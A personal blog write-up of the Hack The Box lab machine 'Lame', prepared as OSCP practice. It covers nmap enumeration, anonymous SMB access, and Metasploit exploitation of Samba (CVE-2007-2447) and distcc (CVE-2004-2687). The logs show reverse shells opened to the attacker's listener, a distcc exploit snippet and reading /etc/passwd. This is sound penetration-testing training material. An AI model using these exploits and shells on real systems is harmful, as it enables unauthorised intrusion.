--- 
layout: post 
title: Lame HTB Writeup
date: 2020-05-17 018:00:00 -0400 
categories: InfoSec 
---

Alright let's talk about Lame for a second. Lame is another great box for practicing for the OSCP. This box is similar to the Legacy box in that it's pretty easy to hop into. It's CVE focused and as long as you know how to enumerate, then use tools to search and even Google for the CVEs and vulnerabilities then you should be gucci. If this is your first box that is fine, but I would highly recommend checking out [Legacy](/infosec/2020/05/15/Legacy-HTB-Writeup.html) first. Feel free to use my writeup for that one as well. 

![Screenshot](/assets/img/Walkthroughs/Lame/WebsiteScreenshot.png)

If this writeup isn't enough, HTB does include [a writeup](https://www.hackthebox.eu/home/machines/profile/1) on the site. There are also plenty of videos online how to do this box as well. 

**Here we gooo**

As per usual, we are going to start with some basic scanning to figure out what this bad boy is running and try to find any vulnerabilities right off the bat. Similar to the Legacy box we did, I will scan it using two methods. **Big Nmap** and **NmapAutomator**. 


## nmap
```
nmap -A -T4 -p- 10.10.10.3
```
Note: you might need do throw a ```-Pn``` on it. Additionally, much of my notes are from the first time I broke into this box. I went back a second time to grab screenshots, in doing so, it seems that some of the results were different. For example the FTP server showed up as 2.3.4 one time and 3 the next. We can just make a note of that for now. 

![Nmap](/assets/img/Walkthroughs/Lame/nmap.png)


```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 23:09 EDT
 Nmap scan report for 10.10.10.3
Host is up (0.11s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.27
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3d00h56m27s, deviation: 2h49m45s, median: -3d02h56m29s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-09-26T14:25:22-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 158.93 seconds
```

Let's break this scan down to some bullet points of useful information. 

**Machine info** 

- OS - Linux/Unix
- Hostname - Lame
- Domain - Hackthebox.gr

**Ports open**
- 21 - FTP
- 22 - SSH
- 139 - netbios-ssn (evidence of smb)
- 445 - microsoft-ds (more evidence of smb)  

**Extra info**
- Anonymous FTP allowed
- OpenSSH version 4.7p1
- ports 139 & 445 suggest SMB
- Samba version 3.0.20 - Debian
- port 3632 for distccd (distcc compiler)

Looking ahead, we can already guess that smb is going to be the low hanging fruit. Possibly even FTP as well. The distccd was something I had yet to run into before, we will look at that later. Before we go any further let's compare notes against a NmapAutomator scan. 

## Nmap Automator 
So I've mentioned this script before, if you're interested in seeing what all it scans and tests out, head over to the Github and read the documentation.
[NmapAutomator Github](https://github.com/21y4d/nmapAutomator/)

If I were to take a screenshot, it would take up a massive part of the page. So I've linked a live video of the scan running below. Feel free to take a look. The video allows for copy and paste as well. 

[![asciicast](https://asciinema.org/a/pPTcqnbAhrYWhSQhLOe8cc7bo.svg)](https://asciinema.org/a/pPTcqnbAhrYWhSQhLOe8cc7bo)

Or you can just look at the file here - [nmapAutomator-Scan-File](/assets/img/Walkthroughs/Lame/Lame-nmap-auto.txt)


Out of this massive scan, there are a few things we have learned about this machine that could be useful moving forward. I've pulled snippets from the full scan. 


```
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

```
So we got a confirmation on ports here. 
```
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.27
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
```
*Oof!* FTP anonymous login is accepted. 

```
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Samba version here. 

```
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```
*Another oof!* Challenge response is supported **but** message signing is disabled. Good ole default settings here. 

```
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:4.7p1: 
|       CVE-2008-3844   9.3     https://vulners.com/cve/CVE-2008-3844
|_      CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478
```
Some cute little CVEs for the SSH just in case FTP and SMB doesn't give us any love here. It later lists these vulnerabilities. 

```
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:4.7p1: 
|       CVE-2008-3844   9.3     https://vulners.com/cve/CVE-2008-3844
|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478
|       CVE-2008-1657   6.5     https://vulners.com/cve/CVE-2008-1657
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107
|       CVE-2007-2768   4.3     https://vulners.com/cve/CVE-2007-2768
|       CVE-2014-9278   4.0     https://vulners.com/cve/CVE-2014-9278
|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755
|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814
|       CVE-2011-5000   3.5     https://vulners.com/cve/CVE-2011-5000
|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327
|_      CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259
```
```
 distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|       https://distcc.github.io/security.html
|_      https://nvd.nist.gov/vuln/detail/CVE-2004-2687
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Wellll welll well. Looks like this weird port that I've never seen before has a CVE for it as well. AND it's highly vulnerable. Awesome. Looking good for us bad guys so far. 

```
---------------------Running Recon Commands----------------------


Starting smbmap scan

[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
Disk                                                    Permissions     Comment
----                                                    -----------     -------
print$                                                  NO ACCESS       Printer Drivers
tmp                                                     READ, WRITE     oh noes!
opt                                                     NO ACCESS
IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))

Finished smbmap scan

=========================
```
*LMAO OOOOF* we keep finding goodies here. Looks like we have read and write in the 10.10.10.3:445/tmp location here kids. This could be extra useful. 


## SMB Enum
So I would be slacking if I didn't write out some specific ways to enumerate SMB. Our nmapAutomater.sh script really did great work, but even after all that, I would highly suggest picking out something to focus on from that list of interesting fellas, and focus on it. Confirm it yourself, and then move forward. So let's do some SMB enumeration real quick like. 

## SMBMap
![SMBMapScreenshot](/assets/img/Walkthroughs/Lame/smbmap.png)
Okay that looks about right. Identical to what we saw before.

![SMBMapScreenshot](/assets/img/Walkthroughs/Lame/smbmap2.png)
Adding -R gives a little bit more information by going recursively into the folders. 


## smbclient  

![smbclient screenshot](/assets/img/Walkthroughs/Lame/smbclient.png)  
Great so we can successfully login with no password. It even tells us ```Anonymous login successful```.

Being that this is a CTF, we can be a little messy. Let's test our ability to put a file on the file server anonymously.  
![smbput test](/assets/img/Walkthroughs/Lame/smbclientpoke.png) 
 
Sweet! We are able to put files on the victim machine. This could be our ticket.  


## SMB version Samba smbd 3.0.20-Debian

Okay let's take a peek around to see what we can find for vulnerabilities for SMB.  

A quick little *searchsploit* search shows some tasty stuff. 
![searchsploit](/assets/img/Walkthroughs/Lame/searchsploit.png)  

The one in paticular that stands out is the Samba 3.0.20 Command Execution with a Metasploit module.  
It's the exact version and it's code execution which is *mwah chefs kiss*. 

Let's do some searching on metasploit real fast to see what we can find.  
![MetasploitSearch1](/assets/img/Walkthroughs/Lame/MetasploitSearch1.png)  
Oh geez. There is quite a few here. Let's go about this differently. A quick Google search found [this little fella.](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script)  

![Site Screenshot](/assets/img/Walkthroughs/Lame/MetasploitModuleSite.png)

The site says that it works on Samba 3.0.20 which is perfect. The site also gives us the CVE on this. **CVE-2007-2447**  

We can google the CVE to get some more information about it to know what we are dealing with.  

[CVE info from Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447)  
[CVE info from Nist.gov](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)  
[CVE Exploit on EDB](https://www.exploit-db.com/exploits/16320)  
That last link is the same script we were looking at from the Searchsploit. It's starting to look like this might be our best bet. Let's take a look at it from Metasploit.  



## SMB Exploit  

![Finding it in Metasploit](/assets/img/Walkthroughs/Lame/MetasploitModule.png)
Doing a quick search finds this module.  

Let's go ahead and use it and see what the options are.  


```
msf5 > use exploit/multi/samba/usermap_script
 msf5 exploit(multi/samba/usermap_script) > options
 
 Module options (exploit/multi/samba/usermap_script):
 
 Name    Current Setting  Required  Description
 ----    ---------------  --------  -----------
 RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
 RPORT   139              yes       The target port (TCP)
 
 
 Exploit target:
 
 Id  Name
 --  ----
 0   Automatic
 
 
 msf5 exploit(multi/samba/usermap_script) > set rhost 10.10.10.3
 rhost => 10.10.10.3
 msf5 exploit(multi/samba/usermap_script) > run
 
 [*] Started reverse TCP double handler on 10.10.14.17:4444 
 [*] Accepted the first client connection...
 [*] Accepted the second client connection...
 [*] Command: echo uoDexrJBt0bwYHdC;
 [*] Writing to socket A
 [*] Writing to socket B
 [*] Reading from sockets...
 [*] Reading from socket B
 [*] B: "uoDexrJBt0bwYHdC\r\n"
 [*] Matching...
 [*] A is input...
 [*] Command shell session 1 opened (10.10.14.17:4444 -> 10.10.10.3:46751) at 2020-05-11 23:14:41 -0400
 
 
```

Holy Gaucammmoooellee. That was quick and easy. We didn't even have to enumerate the other ports. 


## Shell
So now we have some sort of shell. It's not perfect and it's kind of wonky. But we can test it out real quick. 

![shell](/assets/img/Walkthroughs/Lame/Exploit.png)

This is prettty ugly. But you can tell that I was able to ls, and pwd. Also move into the root folder and find the root.txt and cat it out. So. Technically this box is rooted. Maybe we should check for other users real quick. 

![passwd](/assets/img/Walkthroughs/Lame/passwd.png)

Okay so looking through this, you can see your typical passwd list and there is one that stands out called Makis. Let's see if we can get to Makis home folder.  

![movingaround](/assets/img/Walkthroughs/Lame/movingaround.png)  

Sweet. We were able to find both the root and the user flags. This is realllly done. But.. before we wrap up, there was quite a bit of other vulnerabilities and CVEs right? I'm curious to see what we can do with those heckin cuties. 

# Other Vulns

Let's check the FTP stuff first. Search for it in Metasploit real quick and you'll find something worth poking at. 

```
msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show targets
 
 Exploit targets:
 
 Id  Name
 --  ----
 0   Automatic
 
 
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > options
 
 Module options (exploit/unix/ftp/vsftpd_234_backdoor):
 
 Name    Current Setting  Required  Description
 ----    ---------------  --------  -----------
 RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
 RPORT   21               yes       The target port (TCP)
 
 
 Exploit target:
 
 Id  Name
 --  ----
 0   Automatic
 
 
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.10.10.3
 rhosts => 10.10.10.3
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run
 
 [*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
 [*] 10.10.10.3:21 - USER: 331 Please specify the password.
 [*] Exploit completed, but no session was created.
```
It doesn't do much but let you know you need a password. So let's hit the books on this one. 
## Manual exploit

After doing some Googlefu I found a manual exploit for vsFTPd 2.3.4 - connecting to the ftp and placing a : and ) into the USER field triggers opening port 6200  

Manual exploit references.  

[Exploit vsftpd version 2.3.4](https://mkirbypn.wordpress.com/2016/02/23/exploit-vstftpd-version-2-3-4/)    
[Another reference writeup](https://charlesreid1.com/wiki/Metasploitable/VSFTP)    

![FTP Exploit](/assets/img/Walkthroughs/Lame/ftpExploit.png)      
Weird. Okay. So it opens a new port. From reading about this exploit, the 6200 port should allow us to telnet to it and get a shell. I wasn't successful at getting a shell this way.  

![telnet6200](/assets/img/Walkthroughs/Lame/telnet6200.png)    

Pretty interesting either way. Still a vulnerability even if I couldn't manage to get it working!  



## DistCC Metasploit exploit

Next on our list is this curious DistCC port that is open. We saw from our scan that there is a CVE on it. **CVE:CVE-2004-2687**. Let's try finding something with our highly technical Googling powers and then on Metasploit.   
[Nist.gov CVE information](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)   
[Mitre.org CVE information](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687)    
[Exploit DB - The Metasploit module](https://www.exploit-db.com/exploits/9915)    

Seems like this protocol is used to compile things over the network, and has a flaw that allows us to spit some things at it that gives us a shell.  

The meat of the exploit is simple. Here is a snippet. 

```ruby
def dist_cmd(*args)

		# Convince distccd that this is a compile
		args.concat(%w{# -c main.c -o main.o})

		# Set distcc 'magic fairy dust' and argument count
		res = "DIST00000001" + sprintf("ARGC%.8x", args.length)

		# Set the command arguments
		args.each do |arg|
			res << sprintf("ARGV%.8x%s", arg.length, arg)
		end
```

Basically just asking it to compile a shell. Okay okay. summplee.  

Let's try just poking at it using the Metasploit module.  

![distccExploit](/assets/img/Walkthroughs/Lame/distcc.png)


I had to set a payload for this. Setting the options were easy.  


```
msf5 > use exploit/unix/misc/distcc_exec
msf5 exploit(unix/misc/distcc_exec) > options

Module options (exploit/unix/misc/distcc_exec):

Name    Current Setting  Required  Description
----    ---------------  --------  -----------
RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
RPORT   3632             yes       The target port (TCP)

Exploit target:

Id  Name
--  ----
0   Automatic Target

msf5 exploit(unix/misc/distcc_exec) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf5 exploit(unix/misc/distcc_exec) > show targets

Exploit targets:

Id  Name
--  ----
0   Automatic Target

msf5 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse

msf5 exploit(unix/misc/distcc_exec) > run

[*] Started reverse TCP double handler on 10.10.14.17:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo m93VaQ0EKR7SGV6V;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "m93VaQ0EKR7SGV6V\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.17:4444 -> 10.10.10.3:46789) at 2020-05-11 23:49:23 -0400

whoami
daemon
pwd
/tmp
```

Okay well. That's all I have for this box right now. I might come back and dig into some of this later and add things. Hope this helped and all that jazz. 

Cheers, 
Zack. 